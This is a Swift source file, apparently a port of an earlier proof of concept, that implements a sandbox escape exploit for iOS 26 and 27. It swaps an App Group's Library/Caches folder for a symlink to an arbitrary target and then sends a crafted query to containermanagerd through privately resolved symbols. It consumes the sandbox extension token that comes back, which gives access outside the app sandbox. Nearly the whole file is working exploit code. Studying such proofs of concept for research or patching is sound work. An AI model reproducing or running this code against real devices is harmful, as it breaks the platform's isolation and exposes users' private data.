//
//  WorseQuery.swift
//  worsegestalt
//
//  Created by awesomenull on 11/16/26.
//
//  Swift rewrite of worse_query.m — a sandbox escape PoC for iOS 26 and 27,
//  again.
//  Copyright (C) 2026 Taj C (forcequit), ported to Swift 2026.
//
//  This program is free software: you can redistribute it and/or modify
//  it under the terms of the GNU General Public License as published by
//  the Free Software Foundation, either version 3 of the License, or
//  (at your option) any later version.
//
//  This program is distributed in the hope that it will be useful,
//  but WITHOUT ANY WARRANTY; without even the implied warranty of
//  MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
//  GNU General Public License for more details.
//
//  You should have received a copy of the GNU General Public License
//  along with this program.  If not, see <https://www.gnu.org/licenses/>.
//
//  SPDX-License-Identifier: GPL-3.0-or-later
//

import Foundation

enum WorseQuery {

    // MARK: - C function pointer types (libsystem_containermanager / libxpc)

    private typealias WQCreateFn = @convention(c) () -> UnsafeMutableRawPointer?
    private typealias WQU64Fn = @convention(c) (UnsafeMutableRawPointer?, UInt64) -> Void
    private typealias WQObjFn = @convention(c) (UnsafeMutableRawPointer?, UnsafeMutableRawPointer?) -> Void
    private typealias WQGetSingleFn = @convention(c) (UnsafeMutableRawPointer?) -> UnsafeMutableRawPointer?
    private typealias WQFreeFn = @convention(c) (UnsafeMutableRawPointer?) -> Void
    private typealias WQCopyTokenFn = @convention(c) (UnsafeMutableRawPointer?) -> UnsafeMutablePointer<CChar>?
    private typealias WQConsumeFn = @convention(c) (UnsafePointer<CChar>?) -> Int64
    private typealias WQReleaseFn = @convention(c) (Int64) -> Void
    private typealias WQXPCStringFn = @convention(c) (UnsafePointer<CChar>?) -> UnsafeMutableRawPointer?

    // Apple's dlfcn.h defines RTLD_DEFAULT as a cast macro; spell it out.
    private static var rtldDefault: UnsafeMutableRawPointer? {
        UnsafeMutableRawPointer(bitPattern: -2)
    }

    // MARK: - Exploit

    // Remove symlink and recreate Caches directory
    private static func cleanSymlink(_ group: String) {
        guard let groupRoot = FileManager.default
            .containerURL(forSecurityApplicationGroupIdentifier: group) else { return }
        let caches = groupRoot.appendingPathComponent("Library/Caches")
        try? FileManager.default.removeItem(at: caches)
        try? FileManager.default.createDirectory(at: caches, withIntermediateDirectories: false)
    }

    /// So, who's ready for round two?
    ///
    /// Returns the consumed sandbox extension handle (>= 0) or a negative
    /// error code:
    ///   -255  nothing exists at `target` and `createDir` is false
    ///   -1    App Group doesn't exist or we can't access it
    ///   -2    dlopen/dlsym failed (unsupported OS)
    ///   -3    failed to create query
    ///   -4    failed to create symlink
    ///   -5    query rejected by containermanagerd
    ///   -6    kernel refused to issue a sandbox extension
    static func run(target: String, group: String, altFlags: Bool, createDir: Bool) -> Int64 {
        // Check if the target exists
        if !createDir {
            var st = stat()
            if lstat(target, &st) != 0 { return -255 }
        }

        // Get the App Group's path
        // An App Group identifier you control is required for this
        guard let groupRoot = FileManager.default
            .containerURL(forSecurityApplicationGroupIdentifier: group) else { return -1 }
        let caches = groupRoot.appendingPathComponent("Library/Caches").path

        // Resolve functions
        guard let mgr = dlopen("/usr/lib/system/libsystem_containermanager.dylib", RTLD_NOW | RTLD_LOCAL) else {
            return -2 // dlopen failed?
        }
        defer { dlclose(mgr) }

        func fn<T>(_ name: String, _ type: T.Type) -> T? {
            dlsym(mgr, name).map { unsafeBitCast($0, to: type) }
        }
        guard let queryCreate = fn("container_query_create", WQCreateFn.self),
              let querySetClass = fn("container_query_set_class", WQU64Fn.self),
              let querySetGroupIdentifiers = fn("container_query_set_group_identifiers", WQObjFn.self),
              let querySetFlags = fn("container_query_operation_set_flags", WQU64Fn.self)
                  ?? fn("container_query_set_flags", WQU64Fn.self),
              let querySetPart = fn("container_query_operation_set_part", WQU64Fn.self)
                  ?? fn("container_query_set_part", WQU64Fn.self),
              let queryGetSingleResult = fn("container_query_get_single_result", WQGetSingleFn.self),
              let queryFree = fn("container_query_free", WQFreeFn.self),
              let copySandboxToken = fn("container_copy_sandbox_token", WQCopyTokenFn.self),
              let consumeExtension = dlsym(rtldDefault, "sandbox_extension_consume")
                  .map({ unsafeBitCast($0, to: WQConsumeFn.self) }) else {
            return -2 // Failed to resolve a function (unsupported OS)
        }

        // Create query
        guard let query = queryCreate() else { return -3 } // Failed to create query
        defer { queryFree(query) }

        // Set up query
        querySetClass(query, 7) // We're only using class 7 here (appGroup), which goes to containermanagerd
        let identifier = dlsym(rtldDefault, "xpc_string_create")
            .map { unsafeBitCast($0, to: WQXPCStringFn.self) }?(group)
        querySetGroupIdentifiers(query, identifier)
        querySetPart(query, 3) // The query's part sets our base path, part 3 is Library/Caches
        if altFlags {
            // Accessing App Group containers on iOS 26.x needs different flags, for whatever reason
            querySetFlags(query, 0x0000000800000000)
        } else {
            querySetFlags(query, 0x0000008000000000)
        }

        // Set up symlink
        let files = FileManager.default
        try? files.removeItem(atPath: caches)
        guard (try? files.createSymbolicLink(atPath: caches, withDestinationPath: target)) != nil else {
            return -4 // Failed to create symlink
        }

        // Send our query over
        guard let result = queryGetSingleResult(query) else {
            cleanSymlink(group)
            return -5 // Query rejected by containermanagerd
        }
        guard let token = copySandboxToken(result) else {
            cleanSymlink(group)
            return -6 // Kernel refused to issue a sandbox extension
        }

        // Consume sandbox extension and clean up
        let handle = consumeExtension(token)
        free(token)
        cleanSymlink(group)

        return handle
    }

    /// You should probably call this when you're done
    static func release(_ handle: Int64) {
        guard handle >= 0 else { return }
        guard let raw = dlsym(rtldDefault, "sandbox_extension_release") else { return }
        let releaseExtension = unsafeBitCast(raw, to: WQReleaseFn.self)
        releaseExtension(handle)
    }
}
